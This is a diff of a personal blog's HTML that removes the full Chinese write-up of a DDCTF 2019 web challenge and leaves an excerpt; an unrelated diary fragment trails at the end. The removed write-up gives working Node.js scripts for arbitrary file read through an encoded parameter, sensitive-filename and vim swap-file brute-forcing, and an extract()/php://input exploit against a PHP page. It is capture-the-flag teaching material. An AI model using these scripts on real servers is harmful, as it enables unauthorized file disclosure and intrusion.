@@ -321,113 +321,19 @@
       
         
           
-            <h2 id="📎-题目"><a href="#📎-题目" class="headerlink" title="📎 题目"></a>📎 题目</h2><blockquote>
-<p>滴~<br><a href="http://117.51.150.246" target="_blank" rel="noopener">http://117.51.150.246</a></p>
-</blockquote>
-<h2 id="📎-解题过程"><a href="#📎-解题过程" class="headerlink" title="📎 解题过程"></a>📎 解题过程</h2><h3 id="📎-First-time-review"><a href="#📎-First-time-review" class="headerlink" title="📎 First time review"></a>📎 First time review</h3><p>访问题目入口会自动跳转到这个地址：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;117.51.150.246&#x2F;index.php?jpg&#x3D;TmpZMlF6WXhOamN5UlRaQk56QTJOdz09</span><br></pre></td></tr></table></figure>
+          📎 题目
+滴~http://117.51.150.246
 
-<p>拿到访问目标地址的 HTTP 包数据:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;index.php?jpg&#x3D;TmpZMlF6WXhOamN5UlRaQk56QTJOdz09 HTTP&#x2F;1.1</span><br><span class="line">Host: 117.51.150.246</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">DNT: 1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (X11; Linux x86_64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;68.0.3440.75 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Referer: http:&#x2F;&#x2F;117.51.150.246&#x2F;</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9</span><br><span class="line"></span><br><span class="line">HTTP&#x2F;1.1 200 OK</span><br><span class="line">Date: Thu, 18 Apr 2019 12:30:06 GMT</span><br><span class="line">Server: Apache&#x2F;2.4.7 (Unix) PHP&#x2F;5.4.26</span><br><span class="line">X-Powered-By: PHP&#x2F;5.4.26</span><br><span class="line">Keep-Alive: timeout&#x3D;5, max&#x3D;99</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Content-Type: text&#x2F;html;charset&#x3D;utf-8</span><br><span class="line"></span><br><span class="line">&lt;title&gt;TmpZMlF6WXhOamN5UlRaQk56QTJOdz09&lt;&#x2F;title&gt;flag.jpg&lt;&#x2F;br&gt;flag.jpg&lt;&#x2F;br&gt;&lt;img src&#x3D;&#39;data:image&#x2F;gif;base64,&#x2F;9j&#x2F;4AAQSkZ...&#39;&gt;&lt;&#x2F;img&gt;</span><br></pre></td></tr></table></figure>
-
-<p>看起来 QueryString 中 <code>jpg</code> 的值似乎经过了 base64 编码，于是直接在浏览器的 console 里尝试对其解码：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">atob(&#39;TmpZMlF6WXhOamN5UlRaQk56QTJOdz09&#39;)</span><br><span class="line">&#x2F;&#x2F; &lt;- &quot;NjY2QzYxNjcyRTZBNzA2Nw&#x3D;&#x3D;&quot;</span><br></pre></td></tr></table></figure>
-
-<p>尝试二次 base64 解码：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">atob(atob(&#39;TmpZMlF6WXhOamN5UlRaQk56QTJOdz09&#39;))</span><br><span class="line">&#x2F;&#x2F; &lt;- &quot;666C61672E6A7067&quot;</span><br></pre></td></tr></table></figure>
-
-<p>解出的值像是 Hex，尝试用 Node.js 转成字符串：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Buffer.from(&#39;666C61672E6A7067&#39;, &#39;hex&#39;).toString()</span><br><span class="line">&#x2F;&#x2F; &lt;- &#39;flag.jpg&#39;</span><br></pre></td></tr></table></figure>
-
-<p>嗯哼~ 得到的值与响应体中输出的 <code>flag.jpg</code> 一致，猜测可以通过修改 <code>jpg</code> 的值输出指定文件内容。</p>
-<p>那么首先构造出读取当前页面 (<code>index.php</code>) 源文件的地址：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">const &#123; base64 &#125; &#x3D; require(&#39;..&#x2F;common&#x2F;utils&#39;)</span><br><span class="line"></span><br><span class="line">function encode (filename) &#123;</span><br><span class="line">  let hex &#x3D; Buffer.from(filename).toString(&#39;hex&#39;)</span><br><span class="line">  return base64.encode(base64.encode(hex))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">let url &#x3D; &#96;http:&#x2F;&#x2F;117.51.150.246&#x2F;index.php?jpg&#x3D;$&#123;encode(&#39;index.php&#39;)&#125;&#96;</span><br><span class="line">&#x2F;&#x2F; &lt;- &quot;http:&#x2F;&#x2F;117.51.150.246&#x2F;index.php?jpg&#x3D;TmprMlpUWTBOalUzT0RKbE56QTJPRGN3&quot;</span><br></pre></td></tr></table></figure>
-
-<p>访问后发现页面上的字符串已经变成 <code>index.php</code>；然后提取出 <code>&lt;img&gt;</code> 的 <code>src</code> 值，<a href="https://en.wikipedia.org/wiki/Data_URI_scheme#Syntax" target="_blank" rel="noopener">取出 base64 的部分</a> 并做解码，便成功得到</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">&#x2F;*</span><br><span class="line"> * https:&#x2F;&#x2F;blog.csdn.net&#x2F;FengBanLiuYun&#x2F;article&#x2F;details&#x2F;80616607</span><br><span class="line"> * Date: July 4,2018</span><br><span class="line"> *&#x2F;</span><br><span class="line">error_reporting(E_ALL || ~E_NOTICE);</span><br><span class="line"></span><br><span class="line">header(&#39;content-type:text&#x2F;html;charset&#x3D;utf-8&#39;);</span><br><span class="line">if(! isset($_GET[&#39;jpg&#39;]))</span><br><span class="line">    header(&#39;Refresh:0;url&#x3D;.&#x2F;index.php?jpg&#x3D;TmpZMlF6WXhOamN5UlRaQk56QTJOdz09&#39;);</span><br><span class="line">$file &#x3D; hex2bin(base64_decode(base64_decode($_GET[&#39;jpg&#39;])));</span><br><span class="line">echo &#39;&lt;title&gt;&#39;.$_GET[&#39;jpg&#39;].&#39;&lt;&#x2F;title&gt;&#39;;</span><br><span class="line">$file &#x3D; preg_replace(&quot;&#x2F;[^a-zA-Z0-9.]+&#x2F;&quot;,&quot;&quot;, $file);</span><br><span class="line">echo $file.&#39;&lt;&#x2F;br&gt;&#39;;</span><br><span class="line">$file &#x3D; str_replace(&quot;config&quot;,&quot;!&quot;, $file);</span><br><span class="line">echo $file.&#39;&lt;&#x2F;br&gt;&#39;;</span><br><span class="line">$txt &#x3D; base64_encode(file_get_contents($file));</span><br><span class="line"></span><br><span class="line">echo &quot;&lt;img src&#x3D;&#39;data:image&#x2F;gif;base64,&quot;.$txt.&quot;&#39;&gt;&lt;&#x2F;img&gt;&quot;;</span><br><span class="line">&#x2F;*</span><br><span class="line"> * Can you find the flag file?</span><br><span class="line"> *</span><br><span class="line"> *&#x2F;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>Review 代码后可以了解到：</p>
-<ol>
-<li>通过 <code>index.php</code> 接口可以读取指定文件内容（正如前面操作）;</li>
-<li>文件名的全部字符都先经白名单过滤，只允许英文、数字以及 <code>.</code> 通过；</li>
-<li>经过白名单过滤后，文件名再做黑名单过滤，<code>config</code> 将被转换成 <code>!</code>。</li>
-</ol>
-<p>可以分析出：</p>
-<ol>
-<li>字符白名单天然挡掉了 <code>/</code>、<code>%</code>，杜绝了读取上级目录的可能；</li>
-<li>黑名单过滤存在明显的逻辑冲突，这导致最终文件名可以出现白名单中没有的 <code>!</code>；</li>
-<li>目前所能做的事情仅有读取指定文件，但我们仍未知道应该读取哪个文件。</li>
-</ol>
-<p>那么剩下的线索只有 <a href="https://blog.csdn.net/FengBanLiuYun/article/details/80616607" target="_blank" rel="noopener">文件头部注释的链接</a> 了。<br>指过去的是 CSDN 的一篇博客 —— 「命令 echo」，但很明显此 <code>echo</code> 非 <code>index.php</code> 中的 <code>echo</code>，所以博文内容并没有包含什么有用的信息。</p>
-<p><del>（倒是评论区已经在「暴打出题人」了 wwwwww</del></p>
-<p>于是尝试暴力扫描可能命中的文件，这里用 Node.js 快速写个脚本：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">const Queue &#x3D; require(&#39;p-queue&#39;)</span><br><span class="line">const Gauge &#x3D; require(&#39;gauge&#39;)</span><br><span class="line"></span><br><span class="line">const SCAN_CONCURRENCY &#x3D; process.env.SCAN_CONCURRENCY || 5</span><br><span class="line"></span><br><span class="line">async function scan (filenames, &#123; fetch, isHit, concurrency &#x3D; SCAN_CONCURRENCY &#125;) &#123;</span><br><span class="line">  const queue &#x3D; new Queue(&#123; concurrency &#125;)</span><br><span class="line">  const gauge &#x3D; new Gauge()</span><br><span class="line"></span><br><span class="line">  let count &#x3D; 0</span><br><span class="line">  let results &#x3D; []</span><br><span class="line"></span><br><span class="line">  queue.on(&#39;active&#39;, () &#x3D;&gt; &#123;</span><br><span class="line">    gauge.show(&#96;Fetching #$&#123;++count&#125; &#x2F; $&#123;filenames.length&#125;&#96;, count &#x2F; filenames.length)</span><br><span class="line">  &#125;)</span><br><span class="line"></span><br><span class="line">  filenames.forEach((filename) &#x3D;&gt; queue.add(async () &#x3D;&gt;</span><br><span class="line">    results.push(await fetch(filename)))</span><br><span class="line">  )</span><br><span class="line"></span><br><span class="line">  await queue.onIdle()</span><br><span class="line">  gauge.hide()</span><br><span class="line"></span><br><span class="line">  return results.filter(isHit)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">const getStdin &#x3D; require(&#39;get-stdin&#39;)</span><br><span class="line">const got &#x3D; require(&#39;got&#39;)</span><br><span class="line">const cheerio &#x3D; require(&#39;cheerio&#39;)</span><br><span class="line">const flatten &#x3D; require(&#39;just-flatten-it&#39;)</span><br><span class="line">const &#123; base64 &#125; &#x3D; require(&#39;..&#x2F;common&#x2F;utils&#39;)</span><br><span class="line"></span><br><span class="line">&#x2F;**</span><br><span class="line"> * Usage:</span><br><span class="line"> *</span><br><span class="line"> * &#96;&#96;&#96;bash</span><br><span class="line"> * cat .&#x2F;dict.txt | node .&#x2F;scan.js</span><br><span class="line"> *</span><br></pre></td></tr></table></figure>
-<p> */<br>;(async () =&gt; {<br>  function encode (input) {<br>    let hex = Buffer.from(input).toString(‘hex’)<br>    return base64.encode(base64.encode(hex))<br>  }</p>
-<p>  async function fetch (filename) {<br>    const url = <code>http://117.51.150.246/index.php?jpg=${encode(filename)}</code><br>    const { body } = await got(url)<br>    const $ = cheerio.load(body)<br>    return {<br>      filename,<br>      content: base64.decode($(‘img’).attr(‘src’).slice(‘data:image/gif;base64,’.length) || ‘’),<br>    }<br>  }</p>
-<p>  function isHit (response) {<br>    return !!response.content<br>  }</p>
-<p>  let filenames = (await getStdin())<br>    .split(‘\n’)<br>    .map((s) =&gt; s.trim())<br>    .filter(Boolean)</p>
-<p>  let hits = await scan(filenames, { fetch, isHit })<br>  process.stdout.write(JSON.stringify(hits, null, 2))<br>})()</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">然后从 GitHub 找一个 [敏感文件名字典](https:&#x2F;&#x2F;github.com&#x2F;SwiftieTerrence&#x2F;ctfwebscan&#x2F;blob&#x2F;master&#x2F;dic.txt)，开始扫描：</span><br></pre></td></tr></table></figure>
-<p>curl -s <a href="https://raw.githubusercontent.com/SwiftieTerrence/ctfwebscan/a64f510/dic.txt" target="_blank" rel="noopener">https://raw.githubusercontent.com/SwiftieTerrence/ctfwebscan/a64f510/dic.txt</a> | node ./scan.js</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">扫描结果：</span><br></pre></td></tr></table></figure>
-<p>  [<br>    {<br>     “filename”: “index.php”,<br>     “content”: “<?php\r\n/*\r\n * https://blog.csdn.net/FengBanLiuYun/article/details/80616607\r\n * Date: July 4,2018\r\n */\r\nerror_reporting(E_ALL || ~E_NOTICE);\r\n\r\n\r\nheader('content-type:text/html;charset=utf-8');\r\nif(! isset($_GET['jpg']))\r\n    header('Refresh:0;url=./index.php?jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09');\r\n$file = hex2bin(base64_decode(base64_decode($_GET['jpg'])));\r\necho '<title>'.$_GET['jpg'].'</title>';\r\n$file = preg_replace(\"/[^a-zA-Z0-9.]+/\",\"\", $file);\r\necho $file.'</br>';\r\n$file = str_replace(\"config\",\"!\", $file);\r\necho $file.'</br>';\r\n$txt = base64_encode(file_get_contents($file));\r\n\r\necho \"<img src='data:image/gif;base64,\".$txt.\"'></img>\";\r\n/*\r\n * Can you find the flag file?\r\n *\r\n */\r\n\r\n?>\r\n”<br>    },<br>    {<br>      “filename”: “robots.txt”,<br>      “content”: “excuse me?\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\nflag{False flag}\r\n”<br>    }<br>  ]</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">无功而返，滴滴甚至还在 robots.txt 里放了个错误的 flag（感到深深的恶意。</span><br><span class="line"></span><br><span class="line">~~那么这题至此就可以放弃了。~~</span><br><span class="line"></span><br><span class="line">### 📎 为什么都在暴打出题人？</span><br><span class="line"></span><br><span class="line">回到唯一的线索 —— [「命令 echo」](https:&#x2F;&#x2F;blog.csdn.net&#x2F;FengBanLiuYun&#x2F;article&#x2F;details&#x2F;80616607)。</span><br><span class="line">翻遍作者的其它文章，~~通过阅读量和评论数~~ 找到另一篇文章 [「vim 异常退出 swp文件提示」](https:&#x2F;&#x2F;blog.csdn.net&#x2F;FengBanLiuYun&#x2F;article&#x2F;details&#x2F;80913909) ，似乎暗示着我们的目标是一个 vim 交换文件，于是针对文章中提到的三层交换文件修改扫描脚本：</span><br></pre></td></tr></table></figure>
-<p>  // …<br>  const flatten = require(‘just-flatten-it’)</p>
-<p>  let filenames = (await getStdin())<br>     .split(‘\n’)<br>     .map((s) =&gt; s.trim())<br>     .filter(Boolean)</p>
-<p>  filenames = flatten(filenames.map((name) =&gt; [<br>     name,<br>     <code>.${name}.swp</code>,<br>     <code>.${name}.swo</code>,<br>     <code>.${name}.swn</code>,<br>  ]))</p>
-<p>  // …</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">并把文中示例使用的文件名 &#96;practice.txt&#96; 也加入字典：</span><br></pre></td></tr></table></figure>
-<p> { curl -s <a href="https://raw.githubusercontent.com/SwiftieTerrence/ctfwebscan/master/dic.txt" target="_blank" rel="noopener">https://raw.githubusercontent.com/SwiftieTerrence/ctfwebscan/master/dic.txt</a> ; echo “\npractice.txt” } | node ./scan.js</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">但依旧扫不到新的文件。</span><br><span class="line"></span><br><span class="line">~~那么这题至此又可以放弃了。~~</span><br><span class="line"></span><br><span class="line">在被这道关卡卡住一晚之后，看着 &#96;index.php&#96; 中的 &#96;&lt;&#x2F;br&gt;&#96;，我鬼使神差地意识到出题人也许还犯了其他低级错误。于是把扫描脚本改为：</span><br></pre></td></tr></table></figure>
-<p>  filenames = flatten(filenames.map((name) =&gt; [<br>    name,</p>
-<ul>
-<li><code>.${name}.swp</code>,</li>
-</ul>
-<ul>
-<li><code>${name}.swp</code>,</li>
-</ul>
-<ul>
-<li><code>.${name}.swo</code>,</li>
-</ul>
-<ul>
-<li><code>${name}.swo</code>,</li>
-</ul>
-<ul>
-<li><code>.${name}.swn</code>,</li>
-</ul>
-<ul>
-<li><p><code>${name}.swn</code>,<br>]))</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">再次扫描，得到结果：</span><br></pre></td></tr></table></figure>
-<p>[<br>{<br>“filename”: “index.php”,<br>“content”: “<?php\r\n/*\r\n * https://blog.csdn.net/FengBanLiuYun/article/details/80616607\r\n * Date: July 4,2018\r\n */\r\nerror_reporting(E_ALL || ~E_NOTICE);\r\n\r\n\r\nheader('content-type:text/html;charset=utf-8');\r\nif(! isset($_GET['jpg']))\r\n    header('Refresh:0;url=./index.php?jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09');\r\n$file = hex2bin(base64_decode(base64_decode($_GET['jpg'])));\r\necho '<title>'.$_GET['jpg'].'</title>';\r\n$file = preg_replace(\"/[^a-zA-Z0-9.]+/\",\"\", $file);\r\necho $file.'</br>';\r\n$file = str_replace(\"config\",\"!\", $file);\r\necho $file.'</br>';\r\n$txt = base64_encode(file_get_contents($file));\r\n\r\necho \"<img src='data:image/gif;base64,\".$txt.\"'></img>\";\r\n/*\r\n * Can you find the flag file?\r\n *\r\n */\r\n\r\n?>\r\n”<br>},<br>{<br>“filename”: “robots.txt”,<br>“content”: “excuse me?\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\nflag{False flag}\r\n”<br>},<br>{<br>“filename”: “practice.txt.swp”,<br>“content”: “f1ag!ddctf.php”<br>}<br>]</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">惊了。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### 📎 PHP 变量覆盖和远程文件包含</span><br><span class="line"></span><br><span class="line">无论如何，终于还是拿到了下一个线索 &#96;flag!ddctf.php&#96;。</span><br><span class="line">结合前面对 &#96;index.php&#96; 的解读，这一步就显得非常简单了：</span><br></pre></td></tr></table></figure>
-<p>// …<br>let url = <code>http://117.51.150.246/index.php?jpg=${encode(&#39;flagconfigddctf.php&#39;)}</code><br>// &lt;- “<a href="http://117.51.150.246/index.php?jpg=TmpZMll6WXhOamMyTXpabU5tVTJOalk1TmpjMk5EWTBOak0zTkRZMk1tVTNNRFk0TnpBPQ==&quot;" target="_blank" rel="noopener">http://117.51.150.246/index.php?jpg=TmpZMll6WXhOamMyTXpabU5tVTJOalk1TmpjMk5EWTBOak0zTkRZMk1tVTNNRFk0TnpBPQ==&quot;</a></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">再用与前面相同的方法 —— 提取 &#96;&lt;img&gt;&#96; 的 &#96;src&#96;，并做 base64 解码；便轻松获取到了 &#96;flag!ddctf.php&#96; 的内容：</span><br></pre></td></tr></table></figure>
-<?php
-include('config.php');
-$k = 'hello';
-extract($_GET);
-if(isset($uid))
-{
-$content=trim(file_get_contents($k));
-if($uid==$content)
- {
-         echo $flag;
- }
- else
- {
-         echo'hello';
- }
-}
-
-?>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">Review 后发现这里涉及两个 ~~CTF~~ 常见的 PHP 的安全问题：</span><br><span class="line"></span><br><span class="line">1.  [extract() 变量覆盖](https:&#x2F;&#x2F;ctf-wiki.github.io&#x2F;ctf-wiki&#x2F;web&#x2F;php&#x2F;php&#x2F;#extract)</span><br><span class="line">2.  [远程文件包含 - PHP 流 input](https:&#x2F;&#x2F;ctf-wiki.github.io&#x2F;ctf-wiki&#x2F;web&#x2F;php&#x2F;php&#x2F;#_3)</span><br><span class="line"></span><br><span class="line">于是构造请求参数 &#96;k&#x3D;php:&#x2F;&#x2F;input&#96;，使 &#96;$content&#96; 值等于 Request Body 的内容；并把相同的值（如 &#96;zero&#96;）传入参数 &#96;uid&#96; 和 Request Body；使得最终 &#96;$uid &#x3D;&#x3D; $content&#96;：</span><br></pre></td></tr></table></figure>
-<p>const got = require(‘got’)</p>
-<p>;(async () =&gt; {<br>const url = <code>http://117.51.150.246/f1ag!ddctf.php?uid=zero&amp;k=php://input</code><br>const { body } = await got.post(url, {<br>body: ‘zero’,<br>})<br>console.log(body)<br>// &lt;- “DDCTF{436f6e67726174756c6174696f6e73}”<br>})()</p>
-<pre><code></code></pre></li>
-</ul>
-<p>获得 flag <code>DDCTF{436f6e67726174756c6174696f6e73}</code>，拿下第一关 ✌️。</p>
-
-          
+📎 解题过程📎 First time review访问题目入口会自动跳转到这个地址：
+1http:&#x2F;&#x2F;117.51.150.246&#x2F;index.php?jpg&#x3D;TmpZMlF6WXhOamN5U
+          ...
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2019/04/13/DDCTF%202019%20Web%201/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -545,16 +451,19 @@ if($uid==$content)
       
         
           
-            <h3 id="距离高考还有-341天"><a href="#距离高考还有-341天" class="headerlink" title="距离高考还有 ### 341天"></a>距离高考还有 ### 341天</h3><p>北京时间2017.07.01 02:00 a.m</p>
-<p>到底还是把数学试卷写完。自控力在紧张感愈加强大。</p>
-<p>最近的生活终于规矩了，压力感不断上升，可能是个疯子。</p>
-<p>重新体验到上课这久违的感觉，竟存在些许陌生。不闻窗外事，内心不断告诉自己，该努力该努力该努力了！！！</p>
